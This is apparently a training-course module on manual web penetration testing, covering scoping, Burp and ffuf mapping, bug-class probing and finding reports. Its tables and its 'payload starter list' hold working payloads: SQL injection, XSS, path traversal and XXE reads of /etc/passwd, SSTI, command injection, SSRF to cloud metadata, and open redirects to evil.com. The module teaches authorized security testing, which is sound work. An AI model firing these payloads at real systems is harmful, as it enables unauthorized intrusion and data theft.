# Manual web testing

Automated scanners find low-hanging fruit. Real bugs — the ones that get bounties, that break business logic, that turn into incidents — are found by patient humans driving Burp by hand. This module is the methodology: how to take a fresh web target, map it, enumerate inputs, walk through bug classes one by one, and emerge with a list of confirmed findings rather than a wall of "potential issues, please verify manually."

Manual testing is slower than scanning, more thorough, and the only way to find logic bugs (which scanners cannot reason about). It's also how every senior application-security person spends their day.

> **Ethics first, every time.** Manual testing tools are indistinguishable from manual attacking tools. The CSOT lab at `127.0.0.1:5000`, PortSwigger Academy, HackTheBox boxes you have access to, and your own deployments are fair game. Everything else needs **written** authorization and a defined scope. "It's just curl" doesn't help in court.

---

## The four phases

Every engagement, large or small, follows the same arc:

```
1. Scope & understand     What am I allowed to touch? What does the app do?
        ↓
2. Map                    Enumerate every page, parameter, endpoint, asset
        ↓
3. Test                   Walk inputs through each bug class; capture evidence
        ↓
4. Report                 Reproducible writeup with steps, impact, fix
```

Skip phase 1 and you're an attacker. Skip phase 2 and you'll miss half the surface. Skip phase 3 and your "bug" is a guess. Skip phase 4 and the bug never gets fixed.

---

## Phase 1 — scope and understand

### Define scope

Write it down. A scope is a list of hosts/paths you may touch and a list you may not.

```
In scope:
  http://127.0.0.1:5000/*
  https://test.example.com/*
Out of scope:
  Anything that isn't 127.0.0.1:5000
  /admin/billing (third-party panel)
  Production DBs of any kind
Methods allowed:
  No DoS, no brute force above 10 req/s, no destructive payloads on shared data
```

Even when the answer is "the whole lab is yours," writing the scope sentence puts the right frame around the work.

### Understand the app's business

Five minutes of reading saves five hours of poking. Before you fire up Burp, walk the app like a real user:

1. Sign up. What fields does the form ask for?
2. Log in. What does the response set as cookies / tokens?
3. Click through the main features. Make a purchase. Send a message. Upload a file.
4. Find the "settings" and "billing" areas — sensitive endpoints live there.
5. Log out and confirm what happens to the session.

This is also where you note **user roles**. If the app has admin, member, and guest, you'll spend phase 3 walking every endpoint as each.

---

## Phase 2 — map the application

The goal is a complete inventory of attack surface. The basic tools are the same as Week 2's recon, applied to one host.

### Passive crawl with Burp

1. Open Burp's built-in browser.
2. Click every link, submit every form, exercise every flow.
3. **Target → Site map** now shows you everything you've touched.
4. Right-click the host → **Engagement tools → Find scripts / Find comments** for cheap wins.

Burp's Pro spider is more thorough; Community gives you passive crawling. Just being deliberate about every click in a single browsing session covers most of an app.

### Active directory/file brute force

Off-screen content lives where there are no links. Use a wordlist.

```bash
ffuf -u http://127.0.0.1:5000/FUZZ -w /usr/share/wordlists/dirb/common.txt \
     -mc 200,301,302,401,403 -fs 0
```

| Flag | Meaning |
|------|---------|
| `-u` | URL with `FUZZ` marker |
| `-w` | Wordlist |
| `-mc` | Match these status codes |
| `-fs` | Filter out responses of this size (e.g., 404 page size) |
| `-fc` | Filter out specific status codes |
| `-recursion` | Recurse into discovered directories |

`gobuster dir`, `feroxbuster`, and `dirsearch` solve the same problem with slightly different ergonomics. They're covered in [web-scanning-auditors.md](web-scanning-auditors.md).

### Read the JS bundle

Modern apps put half their endpoints in JavaScript. Extract them:

```bash
# Pull JS files
curl -s http://target/main.js | grep -oE '"/api/[^"]+"' | sort -u

# Or with httpx + Wayback
echo target | httpx -silent | waybackurls | grep -E '\.js$' | head
```

JS often leaks: API base URLs, hidden routes, role names, feature flags, occasionally API keys (search for `AIza...`, `sk_live_`, `AKIA`, `eyJ` patterns).

### Inventory inputs

For every page or endpoint you find, list every controllable parameter:

```
GET  /login            → no params
POST /login            → u, p (form-urlencoded)
GET  /search           → q
GET  /user             → id
GET  /page             → name
GET  /setrole          → role
POST /transfer         → amt
GET  /api/notes        → none
POST /api/notes        → JSON body (any keys)
```

Plus every header that the app might trust: `Cookie`, `Authorization`, `X-Forwarded-For`, `Host`, `Referer`, custom `X-*`. The "**every header is input**" mindset is half of bug bounty.

---

## Phase 3 — test each input class

Walk the bug classes one by one. For each, pick the right input and probe.

### Reconnaissance pattern (try every input)

Before the heavy testing, run a quick probe on every input:

| Probe | What you're looking for |
|-------|-------------------------|
| `'` | SQL error → SQLi |
| `"` | Same |
| `<svg onload=alert(1)>` | Reflected echo → XSS |
| `${7*7}` `{{7*7}}` | Reflected `49` → SSTI |
| `;ls` `\|id` `` `id` `` | Command output → command injection |
| `../../etc/passwd` | File contents → LFI/path traversal |
| `http://127.0.0.1:22/` | TCP banner / open behavior → SSRF |
| `99999999999` | Numeric overflow → IDOR, type confusion |
| `null`, `[]`, `{}` | Type confusion / NoSQL |
| Empty value | Missing-input handling |
| Very long value (>10k) | Buffer issues, parser bugs |

You're not exploiting yet — you're listening for the **change** in response. Different status, different length, error string, slow response. Anything different is a lead.

### Authentication — login, session, password reset

Walk each auth feature systematically.

**Registration:**

- Weak password accepted? Try `"a"`, `"123"`, the username itself.
- Existing username — does error message reveal user existence?
- Username with special chars (`admin`, `admin '`, `admin\n`, `Admin`) — case sensitivity, normalization bugs?
- Email confirmation required? Can you bypass it?

**Login:**

- Rate limiting present? Try 50 failures in a row.
- Lockout policy? After lockout, does it leak existence (`"this account is locked"`)?
- SQLi in login form — see lab `/login`.
- Different errors for "user not found" vs "wrong password"?

**Session:**

- Capture the cookie. Inspect attributes (`HttpOnly`, `Secure`, `SameSite`).
- Predictable? Capture 100 sessions and look for patterns. Sequencer can help.
- Does logout invalidate the cookie server-side?
- Does the cookie work after password change?
- Does the cookie work from a different IP / UA?

**Password reset:**

- Token-based: long random token? One-time use? Expires? Bound to original user only?
- Reset URL leaked in `Referer:` to third-party CDN?
- Reset endpoint reveals user existence (`"no such email"` vs `"reset sent"`)?
- Host header injection (`Host: evil.com`) makes the reset email link to `evil.com/reset?token=…`?

The CSOT lab demonstrates the session-cookie issue in [../../CTFs/week-03/session-cookie/](../../CTFs/week-03/session-cookie/) — flipping the `role` cookie from `user` to `admin` and getting the flag.

### Access control — vertical and horizontal

The hardest category to scan, the easiest to find by hand.

**Vertical** — does a low-privilege user reach high-privilege endpoints?

Walk every admin URL while logged in as a regular user. The admin URL might be `/admin`, `/admin.php`, `/manage`, `/dashboard/internal`, `/api/internal/users` — read the JS bundle and the sitemap to find them.

**Horizontal** — does user A reach user B's data?

For every endpoint that takes an ID, swap it. The classic IDOR pattern:

```bash
# Logged in as Alice, who is user 1
curl -b 'session=alice_cookie' http://target/api/user/1   # → Alice's data
curl -b 'session=alice_cookie' http://target/api/user/2   # → Bob's data? IDOR
```

Test patterns:

- Numeric IDs: `1` → `2` → `99999`
- UUIDs: harder to guess; check if they're enumerable via list endpoints, leaked in logs, or sequential `uuid1` style
- Predictable identifiers: usernames, email-derived IDs
- "Hidden" through Base64: decode and re-encode

The lab's [../../CTFs/week-03/idor-profile/](../../CTFs/week-03/idor-profile/) is the canonical demo. Swap `id=1` for `id=2`.

**Forced browsing for files:**

`/page?name=secret` in the lab is path traversal in disguise. The server tries to be safe by blocking `..` and `/`, but `name=secret` happens to be a special-case file outside the normal pages directory. Real apps often have similar ad-hoc bypasses around an apparently safe deny list.

### Injection — the big tent

Probe every input with the cheat-sheet from above, then go deeper on the ones that reacted.

**SQL injection workflow:**

```
1. Insert a single quote → 500 / SQL error? You found one.
2. Try `' OR '1'='1'-- ` for auth bypass.
3. Detect boolean-based blind by comparing  ' AND '1'='1  vs  ' AND '1'='2  responses.
4. Detect time-based blind by injecting `; SELECT pg_sleep(5)-- `.
5. Exfiltrate with UNION SELECT, EXTRACTVALUE, or sqlmap if you confirmed manually.
```

```sql
'; UNION SELECT user,pass FROM users --        -- if column count matches
' AND 1=1 --                                    -- always true
' AND 1=2 --                                    -- always false
'; WAITFOR DELAY '0:0:5' --                     -- MSSQL time-based
' OR sleep(5)#                                  -- MySQL time-based
```

`sqlmap` is the automated finisher once you have a confirmed manual injection point. Don't fire it blindly — use it with `--proxy=http://127.0.0.1:8080` so Burp logs everything.

**XSS workflow:**

```
1. Submit a harmless marker: csot-marker-12345
2. Look for it reflected in the response.
3. Identify the context: HTML body? Attribute? Script tag? URL?
4. Pick a payload that breaks out of that context.
```

| Context | Payload |
|---------|---------|
| HTML body | `<svg onload=alert(1)>` |
| Attribute value | `" autofocus onfocus=alert(1) x="` |
| JavaScript string | `';alert(1);//` |
| URL parameter (`href`) | `javascript:alert(1)` |
| JSON-in-HTML | `</script><script>alert(1)</script>` |

The lab `/search` looks for `<script>` literally — submit `<script>alert(1)</script>` and the flag appears. In real apps you'd use the lighter `<svg onload=...>` variants because many filters block `<script>` specifically.

**Other injection forms:**

| Injection | Probe | Confirm |
|-----------|-------|---------|
| Command | `; id`, `\| id`, `` `id` `` | `uid=...` in response |
| Template (Jinja/Twig) | `{{7*7}}` | `49` in response |
| Template (FreeMarker/Velocity) | `${7*7}` | `49` |
| XXE | XML body with `<!ENTITY xxe SYSTEM "file:///etc/passwd">` | File contents |
| NoSQL | `{"$gt":""}` as a password | Auth bypass |
| LDAP | `*)(uid=*` | Filter manipulation |
| Header injection (CRLF) | `%0d%0aSet-Cookie: x=1` | Injected header in response |

### Path traversal / LFI

If the app reads files based on input:

```
?file=normal.txt                              # baseline
?file=../normal.txt                           # does it normalize?
?file=../../etc/passwd                        # classic
?file=....//....//etc/passwd                  # double-encoded traversal
?file=%2e%2e/%2e%2e/etc/passwd                # URL-encoded
?file=..%c0%af..%c0%afetc/passwd              # overlong UTF-8 (old IIS)
?file=/etc/passwd%00.txt                      # null byte (old PHP)
?file=php://filter/convert.base64-encode/resource=index.php   # PHP wrapper
```

The lab's `/page` blacklists `..` and leading `/`, but special-cases `name=secret` to read `/app/secret/flag_lfi.txt`. The takeaway: blacklists fail. Allow-lists succeed.

### Client-side issues — CSRF, clickjacking, open redirect

These are about how the app interacts with attacker-controlled pages.

**CSRF test:**

For any state-changing endpoint (POST/PUT/PATCH/DELETE):

1. Capture a successful request in Burp.
2. Replay it stripped of the session cookie. Does it work? → no auth (a different bug).
3. Replay it stripped of any CSRF token. Does it still work? → no CSRF protection.
4. Replay from a different `Origin:` or no `Origin:`. Accepted? → CSRF possible.
5. Try a `SameSite=None` cookie scenario.

The lab's `/transfer` accepts a POST with no token check — fire `curl -X POST http://127.0.0.1:5000/transfer -d "amt=1"` and you get the flag.

**Clickjacking:**

```html
<iframe src="https://target/" width="800" height="600"></iframe>
```

If it loads (no `X-Frame-Options: DENY` and no CSP `frame-ancestors`), you can iframe the target and trick a user into clicking through a transparent overlay.

**Open redirect:**

```
?next=https://evil.com
?return_url=//evil.com
?url=javascript:alert(1)
```

Useful in phishing (the target's domain in the URL builds trust) and as a chain element (OAuth redirect + open redirect = account takeover).

### Business logic

Logic bugs come from understanding the app, not from any wordlist. Examples:

- Coupon code with no per-account limit — apply it 1000 times.
- Bank transfer with `amount=-100` reverses the direction.
- Vote endpoint with no rate limit — script 10,000 votes.
- Shopping cart that totals on the client.
- 2FA "remember this device" with a guessable token.
- Free trial check that just looks at a cookie.

These are gold and require thinking, not probing. Spend at least 30 minutes per real app trying to "use it wrong."

---

## Phase 4 — record findings

Take notes from the start. The bug you can't reproduce six hours later doesn't exist.

```
# Finding template
Title:         IDOR in /user — leaks any user's profile by id parameter
Severity:      High
Category:      OWASP A01 Broken Access Control
Endpoint:      GET /user?id={user_id}
Auth required: No
Repro:
  curl http://127.0.0.1:5000/user?id=2
  → 200 {"name":"Bob","secret":"csot26{insecure_direct_object_reference}"}
Impact:
  Any authenticated or unauthenticated request can read any user's profile,
  including private fields, by incrementing the id parameter.
Fix:
  Enforce session-bound authorization in the handler. Verify request session
  owns the requested id, or has an "admin" role, before returning data.
Evidence:
  burp-history-2026-05-27.json (request 42 and 47)
```

Keep raw evidence: the Burp HTTP-history export, the curl transcript, screenshots if the bug is visual. Real reports include a "reproduction steps" section that the developer can copy-paste.

---

## Payload starter list — keep this handy

Copy this section into your notes. You'll use these on every engagement.

```
# SQL
'
"
' OR '1'='1'-- 
' OR '1'='2'-- 
admin'-- 
admin'/*
') OR ('1'='1
"; WAITFOR DELAY '0:0:5'-- 
' AND SLEEP(5)-- 
1' UNION SELECT NULL,NULL,NULL-- 

# XSS
<script>alert(1)</script>
<svg onload=alert(1)>
<img src=x onerror=alert(1)>
"><script>alert(1)</script>
javascript:alert(1)
'-alert(1)-'
"><img src=x onerror=alert(document.domain)>

# Path traversal
../../../etc/passwd
..%2f..%2f..%2fetc%2fpasswd
....//....//etc/passwd
/etc/passwd%00
%252e%252e%252f%252e%252e%252fetc%252fpasswd
php://filter/convert.base64-encode/resource=index.php

# SSTI
{{7*7}}
${7*7}
<%= 7*7 %>
{{config}}
{{''.__class__.__mro__[1].__subclasses__()}}

# Command injection
;id
|id
`id`
$(id)
;sleep 5
|| ping -c 5 127.0.0.1

# SSRF
http://127.0.0.1/
http://localhost/
http://169.254.169.254/latest/meta-data/
http://[::1]/
http://127.0.0.1.nip.io/

# XXE
<!--?xml version="1.0" ?-->
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>

# Open redirect
//evil.com
/\evil.com
javascript:alert(1)
```

---

## Ethics and legality, again

Manual testing is the most powerful skill in this course. With great power, etc.

| Allowed | Not allowed |
|---------|-------------|
| CSOT lab (`127.0.0.1:5000`) | Anything else in your hostel network |
| PortSwigger Academy labs | A friend's site without **written** permission |
| HackTheBox / TryHackMe over VPN | A real company's API "to see how strong it is" |
| Your own sites and deployments | Public web apps, even your university's |
| Authorized bug bounty targets within scope | Bug bounty targets out of scope |

A useful self-check: "If this app's security team caught me, would I be able to show them a written authorization?" If the answer is no, you don't have authorization.

---

## Workflow recap

The whole methodology in one block:

```
1. SCOPE          What hosts? What methods? What's off-limits?
2. UNDERSTAND     Browse as a real user. Map roles and features.
3. MAP            Burp Site map + ffuf + JS reading → full input inventory.
4. PROBE          Run the cheat-sheet probes on every input. Listen for "different".
5. EXPLOIT        For each lead, walk the relevant bug-class section above.
6. RECORD         Title, severity, repro, impact, fix. Keep raw evidence.
7. REPORT         Tight write-up; one bug per finding; no chaining surprises.
```

Drill this loop on the CSOT lab. Then on PortSwigger Academy. By the third app you do it on, the order becomes automatic.

---

## Further reading

- [OWASP Web Security Testing Guide (WSTG)](https://owasp.org/www-project-web-security-testing-guide/) — the canonical methodology, far deeper than this module.
- [PortSwigger Web Security Academy](https://portswigger.net/web-security) — labs aligned to each bug class.
- [HackTricks — Web Pentesting](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web) — exhaustive offensive playbook.
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) — encyclopedia of payloads for every injection family.
- [Bug Bounty Methodology — Jhaddix](https://github.com/jhaddix/tbhm) — workflow used by working bug-bounty pros.

---

## Next module

[web-scanning-auditors.md](web-scanning-auditors.md) — now that you can test by hand, learn the automated tools that complement (not replace) the manual workflow, and the ethics that come with running them at speed.
